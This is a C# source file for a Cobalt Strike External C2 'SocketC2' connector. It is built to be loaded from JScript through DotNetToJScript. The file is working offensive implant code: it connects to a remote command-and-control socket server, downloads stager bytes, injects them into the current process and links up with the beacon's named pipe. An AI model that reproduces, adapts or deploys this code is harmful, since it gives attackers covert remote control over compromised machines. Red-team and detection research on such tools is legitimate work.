using System;
using System.Runtime.InteropServices;
using ExternalC2.Channels;
using ExternalC2.Connectors;
using ExternalC2.Interfaces;

namespace ExternalC2
{
    /// <summary>
    ///     Socket C2 Connector to integrate with Cobalt Strike External C2
    ///     Class is ComVisble for DotNetToJScript compatibility
    ///     To use with JScript:
    ///     o.Configure('127.0.0.1','2222');
    ///     o.Go()
    /// </summary>
    [ComVisible(true)]
    public class SocketC2 : BeaconConnector, IC2Connector
    {
        /// <summary>
        ///     Create a socket channel with the ipAddr and port
        /// </summary>
        /// <param name="ipAddr"></param>
        /// <param name="port"></param>
        public SocketC2(string ipAddr, string port)
            : base(new SocketChannel(ipAddr, port))
        {
            PipeName = Guid.NewGuid();
            IpAddress = ipAddr;
            Port = port;
        }

        /// <summary>
        ///     Public default constructor for DotNetToJScript and Unit Tests
        ///     Use Configure(ipAddr, port) to setup socket
        /// </summary>
        public SocketC2()
        {
        }

        // Convenient casts for use in Initialize()
        private SocketChannel Server => (SocketChannel) ServerChannel;
        private BeaconChannel Beacon => (BeaconChannel) BeaconChannel;

        /// <summary>
        ///     A unique identifier for the connection and beacon's named pipe
        /// </summary>
        public Guid PipeName { get; private set; }

        /// <summary>
        ///     The IP Address of the External C2 socket server
        /// </summary>
        public string IpAddress { get; private set; }

        /// <summary>
        ///     The listening port of the External C2 socket server
        /// </summary>
        public string Port { get; private set; }

        /// <summary>
        ///     The main initiliazation function responsible for:
        ///     1. Connecting to the ServerChannel (External C2 socket server)
        ///     2. Retreiving the stager from the ServerChannel
        ///     3. Injecting the stager into the current process
        ///     4. Connecting to the pipe created by the injected stager
        /// </summary>
        public override Func<bool> Initialize => () =>
        {
            Console.WriteLine("[-] Connecting to External C2 Socket");
            if (!Server.Connect()) return false;

            Console.WriteLine("[-] Grabbing stager bytes");
            var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

            Console.WriteLine("[-] Creating new stager thread");
            if (InjectStager(stager) == 0) return false;
            Console.WriteLine("[+] Stager thread created!");

            Console.WriteLine($"[-] Connecting to pipe {PipeName}");
            Beacon.SetPipeName(PipeName);
            if (!Beacon.Connect()) return false;
            Console.WriteLine("[+] Connected to pipe. C2 initialization complete!");

            return true;
        };

        /// <summary>
        ///     Configuration function for DotNetToJScript and Unit Tests
        ///     To use with JScript:
        ///     o.Configure('127.0.0.1', '2222');
        ///     o.Go()
        /// </summary>
        /// <param name="ipAddr"></param>
        /// <param name="port"></param>
        public void Configure(string ipAddr, string port)
        {
            Port = port;
            IpAddress = ipAddr;
            PipeName = Guid.NewGuid();
            BeaconChannel = new BeaconChannel(PipeName);
            ServerChannel = new SocketChannel(ipAddr, port);
        }
    }
}